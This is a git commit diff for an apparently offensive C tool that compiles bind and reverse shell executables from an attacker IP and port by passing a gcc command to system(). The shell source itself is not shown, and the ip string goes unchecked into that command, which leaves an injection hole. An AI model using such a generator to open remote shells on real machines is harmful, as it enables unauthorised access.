6337fb84440af0236e37dc450803b2479e783340
zriback <zacharythecdr@gmail.com>
2022-07-04 20:27:09 -0400

    Implemented compiling bind and reverse shell executables using gcc with given parameters

--- src/main/shell.c
+++ src/main/shell.c
@@ -6,8 +6,23 @@
 // Shell struct defined in .h file
 
 void createShellExecutable(struct Shell shell) {
+    char * cmd = (char*)malloc(256*sizeof(char));
+
     // use gcc to create the shell executable with the correct params
-    
+    if (shell.type == 0){
+        printf("Creating bind shell executable...\n");
+        sprintf(cmd, "gcc -D PORT=%d -D IP=%s -o bshell.exe shells/bindshell.c", shell.port, shell.ip);
+    }
+    else if (shell.type == 1){
+        printf("Creating reverse shell executable...\n");
+        sprintf(cmd, "gcc -D PORT=%d -D IP=%s -o rshell.exe shells/reverseshell.c", shell.port, shell.ip);
+    }
+    else{
+        printf("Invalid type.\n");
+    }
+    system(cmd);
+    free(cmd);
+
 }
 
 
--- src/main/shell.h
+++ src/main/shell.h
@@ -1,8 +1,5 @@
 #ifndef SHELL_HEADER
 #define SHELL_HEADER
-
-struct Shell createShell(struct Shell shell);
-
 // Holds basic members pertaining to the shell we are defining
 struct Shell {
     // 0=bind shell, 1=reverse shell
@@ -11,8 +8,12 @@ struct Shell {
     // port to connect on
     int port;
 
-    // attacker's ip address (may not be needed for bind shell?)
-    int * ip; 
+    // attacker's ip address in string format
+    char * ip; 
 };
+
+void createShellExecutable(struct Shell shell);
+
+
 
 #endif
